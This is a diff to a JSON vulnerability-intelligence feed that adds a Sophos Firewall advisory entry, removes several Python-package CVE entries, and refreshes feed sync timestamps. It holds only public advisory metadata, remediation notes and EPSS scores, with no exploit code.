+      "id": "CVE-2025-6704",
+      "title": "Sophos Firewall Secure PDF eXchange preauthentication code execution",
+      "severity": "critical",
+      "cvss": null,
+      "categories": [
+        "Sophos Firewall"
+      ],
+      "published": "2025-07-21",
+      "updated": "2025-07-21",
+      "summary": "Arbitrary file writing in Sophos Firewall Secure PDF eXchange can allow remote code execution before authentication when the specified SPX configuration is combined with High Availability mode.",
+      "affected": "Sophos Firewall 21.5 GA and earlier. The exploitation prerequisites are limited to specifically configured SPX and HA deployments.",
+      "remediation": "Confirm the Sophos hotfix is applied on the supported SFOS version, or upgrade to a version containing the fix (21.0 MR2 or newer per Sophos). Confirm automatic installation of hotfixes is enabled.",
+      "exploitation": "Sophos reported no observed exploitation at the time of its July 2025 advisory.",
+      "sources": [
+        {
+          "label": "Sophos Firewall security advisory",
+          "url": "https://www.sophos.com/en-us/security-advisories/sophos-sa-20250721-sfos-rce"
+        }
+      ],
+      "kind": "cve",
+      "source_type": "vendor_baseline",
+      "source_updated_at": "2025-07-21",
+      "status": "Vendor-sourced historical baseline; not newly disclosed",
+      "first_seen_at": "2026-10-28T02:02:13Z",
+      "known_exploited": false,
+      "action": "Verify the affected version and exposure, then follow the vendor remediation.",
+      "epss": 0.11772,
+      "epss_percentile": 0.96062,
       "epss_as_of": "2026-10-29"
     },
     {
@@ -81935,47 +82271,6 @@
       "epss_as_of": "2026-10-29"
     },
     {
-      "id": "CVE-2023-32785",
-      "title": "Langchain SQL Injection vulnerability",
-      "severity": "critical",
-      "categories": [
-        "Application dependencies",
-        "Python / PyPI"
-      ],
-      "published": "2023-10-21",
-      "updated": "2026-10-27",
-      "summary": "In Langchain before 0.0.247, prompt injection allows execution of arbitrary code against the SQL service provided by the chain.",
-      "affected": "pip: langchain (< 0.0.247)",
-      "remediation": "langchain: 0.0.247",
-      "action": "Match the affected package and version to your deployment before prioritizing remediation.",
-      "sources": [
-        {
-          "label": "GitHub reviewed advisory",
-          "url": "https://github.com/advisories/GHSA-8h5w-f6q9-wg35"
-        },
-        {
-          "label": "Additional advisory",
-          "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-32785"
-        },
-        {
-          "label": "Additional advisory",
-          "url": "https://gist.github.com/rharang/9c58d39db8c01db5b7c888e467c0533f"
-        },
-        {
-          "label": "Additional advisory",
-          "url": "https://github.com/langchain-ai/langchain/issues/5923#issuecomment-1696053841"
-        }
-      ],
-      "exploitation": "Not confirmed by this source; check CISA KEV",
-      "kind": "cve",
-      "cvss": "9.8",
-      "status": "GitHub reviewed advisory",
-      "first_seen_at": "2026-10-28T02:56:43Z",
-      "source_updated_at": "2026-10-27T17:28:51Z",
-      "source_type": "github",
-      "known_exploited": false
-    },
-    {
       "id": "CVE-2023-34119",
       "title": "Insecure temporary file in the installer for Zoom Rooms for Windows before version 5.15.0 may allow an authenticated user to enable an escalation of privilege via local access",
       "severity": "high",
@@ -82105,50 +82400,6 @@
       "epss_as_of": "2026-10-29"
     },
     {
-      "id": "CVE-2023-32321",
-      "title": "Ckan remote code execution and private information access via crafted resource ids",
-      "severity": "critical",
-      "categories": [
-        "Application dependencies",
-        "Python / PyPI"
-      ],
-      "published": "2023-05-24",
-      "updated": "2026-10-27",
-      "summary": "Specific vulnerabilities: * Arbitrary file write in `resource_create` and `package_update` actions, using the `ResourceUploader` object. Also reachable via `package_create`, `package_revise`, and `package_patch` via calls to `package_update`. * Remote code execution via unsafe pickle loading, via Beaker's session store when configured to use the file session store backend. * Potential DOS due to lack of a length check on the resource id. * Information disclosure: A user with permission to create a resource can access any other resource on the system if they know the id, even if they don't have access to it. * Resource overwrite: A user with permission to create a resource can overwrite any resource if they know the id, even if they don't have access to it. ### Impact A user with permissions to create or edit a dataset can upload a resource with a specially crafted id to write the uploaded file in an arbitrary location. This can be leveraged to Remote Code Execution via Beaker's insecure pickle loading. ### Patches All the above listed vulnerabilities have been fixed in CKAN 2.9.9 and CKAN 2.10.1 The patches for CKAN 2.9 should apply easily to previous CKAN versions.",
-      "affected": "pip: ckan (< 2.9.9); pip: ckan (= 2.10.0)",
-      "remediation": "ckan: 2.9.9; ckan: 2.10.1",
-      "action": "Match the affected package and version to your deployment before prioritizing remediation.",
-      "sources": [
-        {
-          "label": "GitHub reviewed advisory",
-          "url": "https://github.com/advisories/GHSA-446m-hmmm-hm8m"
-        },
-        {
-          "label": "Additional advisory",
-          "url": "https://github.com/ckan/ckan/security/advisories/GHSA-446m-hmmm-hm8m"
-        },
-        {
-          "label": "Additional advisory",
-          "url": "https://github.com/ckan/ckan/blob/2a6080e61d5601fa0e2a0317afd6a8e9b7abf6dd/CHANGELOG.rst"
-        },
-        {
-          "label": "Additional advisory",
-          "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-32321"
-        }
-      ],
-      "exploitation": "Not confirmed by this source; check CISA KEV",
-      "kind": "cve",
-      "cvss": "9.8",
-      "status": "GitHub reviewed advisory",
-      "first_seen_at": "2026-10-28T02:56:43Z",
-      "source_updated_at": "2026-10-27T16:25:45Z",
-      "source_type": "github",
-      "known_exploited": false,
-      "epss": 0.01684,
-      "epss_percentile": 0.76905,
-      "epss_as_of": "2026-10-29"
-    },
-    {
       "id": "CVE-2023-2462",
       "title": "Inappropriate implementation in Prompts in Google Chrome prior to 113.0.5672.63 allowed a remote attacker to obfuscate main origin data via a crafted HTML page",
       "severity": "medium",
@@ -82208,50 +82459,6 @@
       "known_exploited": false,
       "epss": 0.00801,
       "epss_percentile": 0.56481,
-      "epss_as_of": "2026-10-29"
-    },
-    {
-      "id": "CVE-2023-1712",
-      "title": "Use of hard-coded, security-relevant constants in deepset-ai/haystack",
-      "severity": "critical",
-      "categories": [
-        "Application dependencies",
-        "Python / PyPI"
-      ],
-      "published": "2023-03-30",
-      "updated": "2026-10-27",
-      "summary": "Use of Hard-coded, Security-relevant Constants in GitHub repository deepset-ai/haystack in version 1.15.0 and prior. A patch is available at commit 5fc84904f198de661d5b933fde756aa922bf09f1.",
-      "affected": "pip: farm-haystack (<= 1.15.0)",
-      "remediation": "No fixed version was listed in this feed. Review the linked vendor advisory.",
-      "action": "Match the affected package and version to your deployment before prioritizing remediation.",
-      "sources": [
-        {
-          "label": "GitHub reviewed advisory",
-          "url": "https://github.com/advisories/GHSA-w7qg-j435-78qw"
-        },
-        {
-          "label": "Additional advisory",
-          "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-1712"
-        },
-        {
-          "label": "Additional advisory",
-          "url": "https://github.com/deepset-ai/haystack/commit/5fc84904f198de661d5b933fde756aa922bf09f1"
-        },
-        {
-          "label": "Additional advisory",
-          "url": "https://huntr.dev/bounties/9a6b1fb4-ec9b-4cfa-af1e-9ce304924829"
-        }
-      ],
-      "exploitation": "Not confirmed by this source; check CISA KEV",
-      "kind": "cve",
-      "cvss": "9.8",
-      "status": "GitHub reviewed advisory",
-      "first_seen_at": "2026-10-28T02:56:43Z",
-      "source_updated_at": "2026-10-27T16:46:00Z",
-      "source_type": "github",
-      "known_exploited": false,
-      "epss": 0.0085,
-      "epss_percentile": 0.58034,
       "epss_as_of": "2026-10-29"
     },
     {
@@ -82624,94 +82831,6 @@
       "epss_as_of": "2026-10-29"
     },
     {
-      "id": "CVE-2021-3563",
-      "title": "Openstack Keystone Incorrect Authorization vulnerability",
-      "severity": "critical",
-      "categories": [
-        "Application dependencies",
-        "Python / PyPI"
-      ],
-      "published": "2022-08-27",
-      "updated": "2026-10-27",
-      "summary": "A flaw was found in openstack-keystone, only the first 72 characters of an application secret are verified allowing attackers bypass some password complexity which administrators may be counting on. The highest threat from this vulnerability is to data confidentiality and integrity. A [patch](https://opendev.org/openstack/keystone/commit/7859ed26003858ebfd9a5e866b43f1a6a9e83dca) is available.",
-      "affected": "pip: keystone (<= 21.0.0)",
-      "remediation": "No fixed version was listed in this feed. Review the linked vendor advisory.",
-      "action": "Match the affected package and version to your deployment before prioritizing remediation.",
-      "sources": [
-        {
-          "label": "GitHub reviewed advisory",
-          "url": "https://github.com/advisories/GHSA-cc99-whm5-mmq3"
-        },
-        {
-          "label": "Additional advisory",
-          "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-3563"
-        },
-        {
-          "label": "Additional advisory",
-          "url": "https://access.redhat.com/security/cve/CVE-2021-3563"
-        },
-        {
-          "label": "Additional advisory",
-          "url": "https://bugs.launchpad.net/ossa/+bug/1901891"
-        }
-      ],
-      "exploitation": "Not confirmed by this source; check CISA KEV",
-      "kind": "cve",
-      "cvss": "9.1",
-      "status": "GitHub reviewed advisory",
-      "first_seen_at": "2026-10-28T02:56:43Z",
-      "source_updated_at": "2026-10-27T16:49:06Z",
-      "source_type": "github",
-      "known_exploited": false,
-      "epss": 0.01863,
-      "epss_percentile": 0.79178,
-      "epss_as_of": "2026-10-29"
-    },
-    {
-      "id": "CVE-2022-31573",
-      "title": "ChainerRL Visualizer 0.1.1 vulnerable to Path Traversal via unsafe use of send_file function",
-      "severity": "critical",
-      "categories": [
-        "Application dependencies",
-        "Python / PyPI"
-      ],
-      "published": "2022-07-12",
-      "updated": "2026-10-27",
-      "summary": "The chainer/chainerrl-visualizer repository through 0.1.1 on GitHub allows absolute path traversal because the Flask send_file function is used unsafely.",
-      "affected": "pip: chainerrl-visualizer (<= 0.1.1)",
-      "remediation": "No fixed version was listed in this feed. Review the linked vendor advisory.",
-      "action": "Match the affected package and version to your deployment before prioritizing remediation.",
-      "sources": [
-        {
-          "label": "GitHub reviewed advisory",
-          "url": "https://github.com/advisories/GHSA-687h-86vc-5x59"
-        },
-        {
-          "label": "Additional advisory",
-          "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-31573"
-        },
-        {
-          "label": "Additional advisory",
-          "url": "https://github.com/github/securitylab/issues/669#issuecomment-1117265726"
-        },
-        {
-          "label": "Additional advisory",
-          "url": "https://github.com/pypa/advisory-database/tree/main/vulns/chainerrl-visualizer/PYSEC-2026-309.yaml"
-        }
-      ],
-      "exploitation": "Not confirmed by this source; check CISA KEV",
-      "kind": "cve",
-      "cvss": "9.3",
-      "status": "GitHub reviewed advisory",
-      "first_seen_at": "2026-10-28T02:56:43Z",
-      "source_updated_at": "2026-10-27T16:19:44Z",
-      "source_type": "github",
-      "known_exploited": false,
-      "epss": 0.01404,
-      "epss_percentile": 0.72458,
-      "epss_as_of": "2026-10-29"
-    },
-    {
       "id": "CVE-2022-24840",
       "title": "Path Traversal in django-s3file",
       "severity": "critical",
@@ -82755,310 +82874,90 @@
       "epss": 0.02067,
       "epss_percentile": 0.8132,
       "epss_as_of": "2026-10-29"
-    },
-    {
-      "id": "CVE-2022-30765",
-      "title": "SQL injection in calibreweb",
-      "severity": "critical",
-      "categories": [
-        "Application dependencies",
-        "Python / PyPI"
-      ],
-      "published": "2022-05-17",
-      "updated": "2026-10-27",
-      "summary": "Calibre-Web before 0.6.18 allows user table SQL Injection.",
-      "affected": "pip: calibreweb (< 0.6.18)",
-      "remediation": "calibreweb: 0.6.18",
-      "action": "Match the affected package and version to your deployment before prioritizing remediation.",
-      "sources": [
-        {
-          "label": "GitHub reviewed advisory",
-          "url": "https://github.com/advisories/GHSA-8ppf-x4gr-2x7g"
-        },
-        {
-          "label": "Additional advisory",
-          "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-30765"
-        },
-        {
-          "label": "Additional advisory",
-          "url": "https://github.com/janeczku/calibre-web/blob/master/SECURITY.md"
-        },
-        {
-          "label": "Additional advisory",
-          "url": "https://github.com/janeczku/calibre-web/releases/tag/0.6.18"
-        }
-      ],
-      "exploitation": "Not confirmed by this source; check CISA KEV",
-      "kind": "cve",
-      "cvss": "9.8",
-      "status": "GitHub reviewed advisory",
-      "first_seen_at": "2026-10-28T02:56:43Z",
-      "source_updated_at": "2026-10-27T16:19:05Z",
-      "source_type": "github",
-      "known_exploited": false,
-      "epss": 0.01207,
-      "epss_percentile": 0.68251,
-      "epss_as_of": "2026-10-29"
-    },
-    {
-      "id": "CVE-2016-8638",
-      "title": "Session Fixation in ipsilon",
-      "severity": "critical",
-      "categories": [
-        "Application dependencies",
-        "Python / PyPI"
-      ],
-      "published": "2022-05-14",
-      "updated": "2026-10-27",
-      "summary": "A vulnerability in ipsilon 2.0 before 2.0.2, 1.2 before 1.2.1, 1.1 before 1.1.2, and 1.0 before 1.0.3 was found that allows attacker to log out active sessions of other users. This issue is related to how it tracks sessions, and allows an unauthenticated attacker to view and terminate active sessions from other users. It is also called a \"SAML2 multi-session vulnerability.\"",
-      "affected": "pip: ipsilon (>= 2.0.0, < 2.0.2); pip: ipsilon (>= 1.2.0, < 1.2.1); pip: ipsilon (>= 1.1.0, < 1.1.2); pip: ipsilon (>= 1.0.0, < 1.0.3)",
-      "remediation": "ipsilon: 2.0.2; ipsilon: 1.2.1; ipsilon: 1.1.2; ipsilon: 1.0.3",
-      "action": "Match the affected package and version to your deployment before prioritizing remediation.",
-      "sources": [
-        {
-          "label": "GitHub reviewed advisory",
-          "url": "https://github.com/advisories/GHSA-376m-3rm2-9jm6"
-        },
-        {
-          "label": "Additional advisory",
-          "url": "https://nvd.nist.gov/vuln/detail/CVE-2016-8638"
-        },
-        {
-          "label": "Additional advisory",
-          "url": "https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2016-8638"
-        },
-        {
-          "label": "Additional advisory",
-          "url": "https://ipsilon-project.org/advisory/CVE-2016-8638.txt"
-        }
-      ],
-      "exploitation": "Not confirmed by this source; check CISA KEV",
-      "kind": "cve",
-      "cvss": "9.1",
-      "status": "GitHub reviewed advisory",
-      "first_seen_at": "2026-10-28T02:56:43Z",
-      "source_updated_at": "2026-10-27T17:26:46Z",
-      "source_type": "github",
-      "known_exploited": false,
-      "epss": 0.02136,
-      "epss_percentile": 0.81945,
-      "epss_as_of": "2026-10-29"
-    },
-    {
-      "id": "CVE-2017-1000469",
-      "title": "Cobbler vulnerable to arbitrary code execution",
-      "severity": "critical",
-      "categories": [
-        "Application dependencies",
-        "Python / PyPI"
-      ],
-      "published": "2022-05-14",
-      "updated": "2026-10-27",
-      "summary": "Cobbler version up to 2.8.2 is vulnerable to a command injection vulnerability in the \"add repo\" component resulting in arbitrary code execution as root user.",
-      "affected": "pip: cobbler (<= 2.8.2)",
-      "remediation": "cobbler: 3.0.0",
-      "action": "Match the affected package and version to your deployment before prioritizing remediation.",
-      "sources": [
-        {
-          "label": "GitHub reviewed advisory",
-          "url": "https://github.com/advisories/GHSA-96hw-v598-jvgh"
-        },
-        {
-          "label": "Additional advisory",
-          "url": "https://nvd.nist.gov/vuln/detail/CVE-2017-1000469"
-        },
-        {
-          "label": "Additional advisory",
-          "url": "https://github.com/cobbler/cobbler/issues/1845"
-        },
-        {
-          "label": "Additional advisory",
-          "url": "https://github.com/cobbler/cobbler/commit/4b20397425a5d42a2d8927233654f4d7435bd4c2"
-        }
-      ],
-      "exploitation": "Not confirmed by this source; check CISA KEV",
-      "kind": "cve",
-      "cvss": "9.8",
-      "status": "GitHub reviewed advisory",
-      "first_seen_at": "2026-10-28T02:56:43Z",
-      "source_updated_at": "2026-10-27T16:18:29Z",
-      "source_type": "github",
-      "known_exploited": false,
-      "epss": 0.05556,
-      "epss_percentile": 0.92822,
-      "epss_as_of": "2026-10-29"
-    },
-    {
-      "id": "CVE-2018-10931",
-      "title": "Cobbler has Exposed Dangerous Method or Function",
-      "severity": "critical",
-      "categories": [
-        "Application dependencies",
-        "Python / PyPI"
-      ],
-      "published": "2022-05-13",
-      "updated": "2026-10-27",
-      "summary": "It was found that cobbler 2.6.x exposed all functions from its CobblerXMLRPCInterface class over XMLRPC. A remote, unauthenticated attacker could use this flaw to gain high privileges within cobbler, upload files to arbitrary location in the context of the daemon.",
-      "affected": "pip: cobbler (>= 2.6.0, < 3.0.0)",
-      "remediation": "cobbler: 3.0.0",
-      "action": "Match the affected package and version to your deployment before prioritizing remediation.",
-      "sources": [
-        {
-          "label": "GitHub reviewed advisory",
-          "url": "https://github.com/advisories/GHSA-8787-63px-3m23"
-        },
-        {
-          "label": "Additional advisory",
-          "url": "https://nvd.nist.gov/vuln/detail/CVE-2018-10931"
-        },
-        {
-          "label": "Additional advisory",
-          "url": "https://access.redhat.com/errata/RHSA-2018:2372"
-        },
-        {
-          "label": "Additional advisory",
-          "url": "https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2018-10931"
-        }
-      ],
-      "exploitation": "Not confirmed by this source; check CISA KEV",
-      "kind": "cve",
-      "cvss": "9.8",
-      "status": "GitHub reviewed advisory",
-      "first_seen_at": "2026-10-28T02:56:43Z",
-      "source_updated_at": "2026-10-27T16:17:55Z",
-      "source_type": "github",
-      "known_exploited": false,
-      "epss": 0.68083,
-      "epss_percentile": 0.99323,
-      "epss_as_of": "2026-10-29"
-    },
-    {
-      "id": "CVE-2018-1000226",
-      "title": "Cobbler Improper Validation of Security Tokens",
-      "severity": "critical",
-      "categories": [
-        "Application dependencies",
-        "Python / PyPI"
-      ],
-      "published": "2022-05-13",
-      "updated": "2026-10-27",
-      "summary": "Cobbler version Verified as present in Cobbler versions 2.6.11+, but code inspection suggests at least 2.0.0+ or possibly even older versions may be vulnerable contains a Incorrect Access Control vulnerability in XMLRPC API (/cobbler_api) that can result in Privilege escalation, data manipulation or exfiltration, LDAP credential harvesting. This attack appear to be exploitable via \"network connectivity\". Taking advantage of improper validation of security tokens in API endpoints. Please note this is a different issue than CVE-2018-10931.",
-      "affected": "pip: cobbler (<= 2.6.11)",
-      "remediation": "cobbler: 3.0.0",
-      "action": "Match the affected package and version to your deployment before prioritizing remediation.",
-      "sources": [
-        {
-          "label": "GitHub reviewed advisory",
-          "url": "https://github.com/advisories/GHSA-f88q-22g8-frcg"
-        },
-        {
-          "label": "Additional advisory",
-          "url": "https://nvd.nist.gov/vuln/detail/CVE-2018-1000226"
-        },
-        {
-          "label": "Additional advisory",
-          "url": "https://github.com/cobbler/cobbler/issues/1916"
-        },
-        {
-          "label": "Additional advisory",
-          "url": "https://github.com/pypa/advisory-database/tree/main/vulns/cobbler/PYSEC-2026-315.yaml"
-        }
-      ],
-      "exploitation": "Not confirmed by this source; check CISA KEV",
-      "kind": "cve",
-      "cvss": "9.8",
-      "status": "GitHub reviewed advisory",
-      "first_seen_at": "2026-10-28T02:56:43Z",
-      "source_updated_at": "2026-10-27T16:17:26Z",
-      "source_type": "github",
-      "known_exploited": false,
-      "epss": 0.12584,
-      "epss_percentile": 0.96223,
-      "epss_as_of": "2026-10-29"
     }
   ],
   "sources": {
     "github": {
       "ok": true,
-      "last_success": "2026-10-29T09:03:53Z",
-      "last_attempt": "2026-10-29T09:03:53Z",
-      "items_processed": 203,
+      "last_success": "2026-10-29T10:01:28Z",
+      "last_attempt": "2026-10-29T10:01:28Z",
+      "items_processed": 198,
       "url": "https://api.github.com/advisories"
     },
     "php_upstream": {
       "ok": true,
-      "last_success": "2026-10-29T09:03:53Z",
-      "last_attempt": "2026-10-29T09:03:53Z",
+      "last_success": "2026-10-29T10:01:28Z",
+      "last_attempt": "2026-10-29T10:01:28Z",
       "items_processed": 66,
       "url": "https://api.github.com/repos/php/php-src/security-advisories"
     },
     "nvd": {
       "ok": true,
-      "last_success": "2026-10-29T09:03:53Z",
-      "last_attempt": "2026-10-29T09:03:53Z",
-      "items_processed": 399,
+      "last_success": "2026-10-29T10:01:28Z",
+      "last_attempt": "2026-10-29T10:01:28Z",
+      "items_processed": 390,
       "url": "https://services.nvd.nist.gov/rest/json/cves/2.0"
     },
     "cisa_kev": {
       "ok": true,
-      "last_success": "2026-10-29T09:03:53Z",
-      "last_attempt": "2026-10-29T09:03:53Z",
+      "last_success": "2026-10-29T10:01:28Z",
+      "last_attempt": "2026-10-29T10:01:28Z",
       "items_processed": 484,
       "url": "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"
     },
     "msrc_rss": {
       "ok": true,
-      "last_success": "2026-10-29T09:03:53Z",
-      "last_attempt": "2026-10-29T09:03:53Z",
+      "last_success": "2026-10-29T10:01:28Z",
+      "last_attempt": "2026-10-29T10:01:28Z",
       "items_processed": 2558,
       "url": "https://api.msrc.microsoft.com/update-guide/rss"
     },
     "fortinet_rss": {
       "ok": true,
-      "last_success": "2026-10-29T09:03:53Z",
-      "last_attempt": "2026-10-29T09:03:53Z",
+      "last_success": "2026-10-29T10:01:28Z",
+      "last_attempt": "2026-10-29T10:01:28Z",
       "items_processed": 14,
       "url": "https://filestore.fortinet.com/fortiguard/rss/ir.xml"
     },
     "ubuntu_rss": {
       "ok": true,
-      "last_success": "2026-10-29T09:03:53Z",
-      "last_attempt": "2026-10-29T09:03:53Z",
+      "last_success": "2026-10-29T10:01:28Z",
+      "last_attempt": "2026-10-29T10:01:28Z",
       "items_processed": 23,
       "url": "https://ubuntu.com/security/notices/rss.xml"
     },
     "debian_rss": {
       "ok": true,
-      "last_success": "2026-10-29T09:03:53Z",
-      "last_attempt": "2026-10-29T09:03:53Z",
+      "last_success": "2026-10-29T10:01:28Z",
+      "last_attempt": "2026-10-29T10:01:28Z",
       "items_processed": 12,
       "url": "https://www.debian.org/security/dsa-long"
     },
     "docker_rss": {
       "ok": true,
-      "last_success": "2026-10-29T09:03:53Z",
-      "last_attempt": "2026-10-29T09:03:53Z",
+      "last_success": "2026-10-29T10:01:28Z",
+      "last_attempt": "2026-10-29T10:01:28Z",
       "items_processed": 0,
       "url": "https://docs.docker.com/security/security-announcements/index.xml"
     },
     "kubernetes": {
       "ok": true,
-      "last_success": "2026-10-29T09:03:53Z",
-      "last_attempt": "2026-10-29T09:03:53Z",
+      "last_success": "2026-10-29T10:01:28Z",
+      "last_attempt": "2026-10-29T10:01:28Z",
       "items_processed": 94,
       "url": "https://k8s.io/docs/reference/issues-security/official-cve-feed/index.json"
     },
     "mariadb": {
       "ok": true,
-      "last_success": "2026-10-29T09:03:53Z",
-      "last_attempt": "2026-10-29T09:03:53Z",
+      "last_success": "2026-10-29T10:01:28Z",
+      "last_attempt": "2026-10-29T10:01:28Z",
       "items_processed": 13,
       "url": "https://api.github.com/repos/MariaDB/server/security-advisories"
     },
     "redhat": {
       "ok": true,
-      "last_success": "2026-10-29T09:03:53Z",
-      "last_attempt": "2026-10-29T09:03:53Z",
+      "last_success": "2026-10-29T10:01:28Z",
+      "last_attempt": "2026-10-29T10:01:28Z",
       "items_processed": 200,
       "url": "https://access.redhat.com/hydra/rest/securitydata/cve.json"
     },
@@ -83070,7 +82969,7 @@
       "url": "https://epss.empiricalsecurity.com/epss_scores-current.csv.gz"
     }
   },
-  "last_checked_at": "2026-10-29T09:03:53Z",
-  "last_successful_update": "2026-10-29T09:03:53Z",
+  "last_checked_at": "2026-10-29T10:01:28Z",
+  "last_successful_update": "2026-10-29T10:01:28Z",
   "note": "Public advisory intelligence only. Actual vulnerability exposure requires asset/version validation."
 }
